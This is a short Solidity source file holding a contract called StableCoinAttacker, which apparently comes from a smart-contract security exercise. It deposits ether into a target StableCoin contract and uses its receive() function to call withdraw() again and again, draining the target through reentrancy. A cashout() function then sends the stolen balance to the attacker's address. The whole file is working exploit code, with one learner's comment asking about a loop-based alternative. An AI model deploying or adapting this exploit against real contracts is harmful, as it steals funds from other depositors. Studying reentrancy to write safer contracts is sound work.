pragma solidity >=0.8.2 <0.9.0;

import "./StableCoin.sol";

contract StableCoinAttacker {

    StableCoin private target;
    address private owner;

    constructor(StableCoin _target) {
        target = _target;
        owner = msg.sender;
    }

    uint private amountPerCall;

    function attack() external payable {
        target.deposit{value: msg.value}();
        amountPerCall = msg.value;
        /* why can't we do the following, with no fallback function:
        for (uint i = 0; i < address(target).balance/amountPerCall; i++) {
            target.withdraw();
        }
        */
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= amountPerCall) {
            target.withdraw();
        }
    }

    function cashout() external {
        payable(owner).transfer(address(this).balance);
    }
}
